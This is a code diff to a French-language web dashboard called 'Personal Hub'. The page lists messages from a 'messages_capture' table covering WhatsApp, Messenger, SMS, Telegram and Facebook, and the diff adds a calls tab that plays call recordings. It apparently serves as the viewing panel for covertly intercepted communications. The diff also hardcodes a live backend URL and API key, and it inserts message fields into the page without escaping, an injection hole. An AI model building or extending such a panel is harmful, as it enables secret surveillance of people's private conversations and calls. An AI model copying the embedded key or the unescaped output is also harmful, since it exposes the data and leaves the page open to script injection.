@@ -7,6 +7,9 @@
 <style>
   body { background:#0d0d1a; color:#ccc; font-family:sans-serif; margin:0; padding:16px; }
   h1 { color:#00d4ff; }
+  .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
+  .tab { padding: 10px 20px; background: #1a1a2e; border-radius: 6px; cursor: pointer; color: #fff; border: 1px solid #333; }
+  .tab.active { background: #00d4ff; color: #000; font-weight: bold; }
   input, select { background:#1a1a2e; color:#fff; border:1px solid #333; padding:8px; border-radius:6px; width:100%; margin-bottom:12px; box-sizing:border-box; }
   .msg { background:#1a1a2e; border-radius:8px; padding:12px; margin-bottom:10px; }
   .contact { color:#00d4ff; font-weight:bold; }
@@ -14,37 +17,64 @@
   .text { margin-top:6px; color:#ddd; }
   .time { color:#445; font-size:11px; margin-top:4px; }
   #count { color:#556; margin-bottom:12px; }
+  audio { width: 100%; margin-top: 8px; }
 </style>
 </head>
 <body>
 <h1>📡 Personal Hub</h1>
 
-<input type="text" id="search" placeholder="🔍 Rechercher un contact ou message..." oninput="filtrer()">
-<select id="source" onchange="filtrer()">
-  <option value="">Toutes les apps</option>
-  <option value="whatsapp">WhatsApp</option>
-  <option value="messenger">Messenger</option>
-  <option value="sms">SMS</option>
-  <option value="telegram">Telegram</option>
-  <option value="facebook">Facebook</option>
-</select>
+<div class="tabs">
+  <div class="tab active" onclick="changerOnglet('messages')">💬 Messages</div>
+  <div class="tab" onclick="changerOnglet('appels')">📞 Appels</div>
+</div>
 
-<div id="count"></div>
-<div id="messages">Chargement...</div>
+<!-- Section Messages -->
+<div id="section-messages">
+  <input type="text" id="search" placeholder="🔍 Rechercher un contact ou message..." oninput="filtrer()">
+  <select id="source" onchange="filtrer()">
+    <option value="">Toutes les apps</option>
+    <option value="whatsapp">WhatsApp</option>
+    <option value="messenger">Messenger</option>
+    <option value="sms">SMS</option>
+    <option value="telegram">Telegram</option>
+    <option value="facebook">Facebook</option>
+  </select>
+  <div id="count"></div>
+  <div id="messages">Chargement...</div>
+</div>
+
+<!-- Section Appels -->
+<div id="section-appels" style="display:none;">
+  <div id="count-appels"></div>
+  <div id="appels">Chargement...</div>
+</div>
 
 <script>
 const SUPABASE_URL = "https://wcgfvjunixmlojptkclp.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndjZ2Z2anVuaXhtbG9qcHRrY2xwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTAwMDk4MTAsImV4cCI6MjEwNTU4NTgxMH0.0YredbrRG773Ug7V5h0IcCjkFBRXMZ__InZ0e1VrS5U";
 
 let tousMessages = [];
+let tousAppels = [];
 
 async function charger() {
-  const res = await fetch(
-    `${SUPABASE_URL}/rest/v1/messages_capture?order=created_at.desc&limit=200`,
-    { headers: { apikey: SUPABASE_KEY, Authorization: "Bearer " + SUPABASE_KEY } }
-  );
-  tousMessages = await res.json();
+  const resMsg = await fetch(`${SUPABASE_URL}/rest/v1/messages_capture?order=created_at.desc&limit=200`, {
+    headers: { apikey: SUPABASE_KEY, Authorization: "Bearer " + SUPABASE_KEY }
+  });
+  tousMessages = await resMsg.json();
   filtrer();
+
+  const resAppels = await fetch(`${SUPABASE_URL}/rest/v1/call_logs?order=id.desc&limit=100`, {
+    headers: { apikey: SUPABASE_KEY, Authorization: "Bearer " + SUPABASE_KEY }
+  });
+  tousAppels = await resAppels.json();
+  afficherAppels();
+}
+
+function changerOnglet(onglet) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  event.target.classList.add('active');
+  document.getElementById('section-messages').style.display = onglet === 'messages' ? 'block' : 'none';
+  document.getElementById('section-appels').style.display = onglet === 'appels' ? 'block' : 'none';
 }
 
 function filtrer() {
@@ -74,6 +104,31 @@ function filtrer() {
         <div class="source">${m.app_source || ""}</div>
         <div class="text">${m.message || ""}</div>
         <div class="time">${date}</div>
+      </div>`;
+  }).join("");
+}
+
+function afficherAppels() {
+  document.getElementById("count-appels").textContent = tousAppels.length + " appel(s)";
+  const div = document.getElementById("appels");
+
+  if (tousAppels.length === 0) {
+    div.innerHTML = "<p style='color:#445'>Aucun appel enregistré.</p>";
+    return;
+  }
+
+  div.innerHTML = tousAppels.map(a => {
+    const date = a.timestamp ? new Date(a.timestamp).toLocaleString("fr-FR") : "Date inconnue";
+    const lecteurAudio = a.recording_url 
+      ? `<audio controls src="${a.recording_url}"></audio>` 
+      : `<p style="color:#666; font-size:12px;">Pas d'enregistrement audio</p>`;
+      
+    return `
+      <div class="msg">
+        <div class="contact">${a.contact || "Numéro inconnu"}</div>
+        <div class="source">${a.call_type || "Appel"} - ${a.duration || ""}</div>
+        <div class="time">${date}</div>
+        ${lecteurAudio}
       </div>`;
   }).join("");
 }
